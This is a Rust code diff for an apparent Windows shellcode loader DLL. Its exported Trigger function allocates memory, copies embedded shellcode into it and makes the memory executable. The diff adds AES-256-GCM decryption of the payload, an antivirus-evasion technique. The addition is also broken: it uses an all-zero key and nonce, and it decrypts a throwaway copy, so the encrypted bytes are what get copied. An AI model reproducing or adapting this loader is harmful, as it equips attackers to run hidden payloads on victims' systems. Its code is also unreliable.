@@ -1,6 +1,9 @@
 use windows::Win32::{Foundation::{HANDLE, HMODULE}, System::{Memory::{VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_PROTECTION_FLAGS, PAGE_READWRITE}, Threading::WaitForSingleObject}};
 use std::thread;
 use std::ptr;
+use aes_gcm::{
+    aead::{AeadMutInPlace, KeyInit}, Aes256Gcm, Key
+};
 
 pub mod shellcode;
 
@@ -13,6 +16,12 @@ pub extern "C" fn Trigger() {
     
     unsafe {
         let address_pointer = VirtualAlloc(None, shellcode::SIZE, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+
+        let byte_key: [u8; 32] = Default::default();
+        let byte_nonce: [u8; 12] = Default::default();
+        let key = Key::<Aes256Gcm>::from_slice(&byte_key);
+        let mut cipher = Aes256Gcm::new(&key);
+        cipher.decrypt_in_place((&byte_nonce).into(), b"", &mut shellcode::SHELLCODE.to_vec());
         
         ptr::copy(shellcode::SHELLCODE.as_ptr(), address_pointer as *mut u8, shellcode::SIZE);
         let old_protection = &mut PAGE_PROTECTION_FLAGS(0);
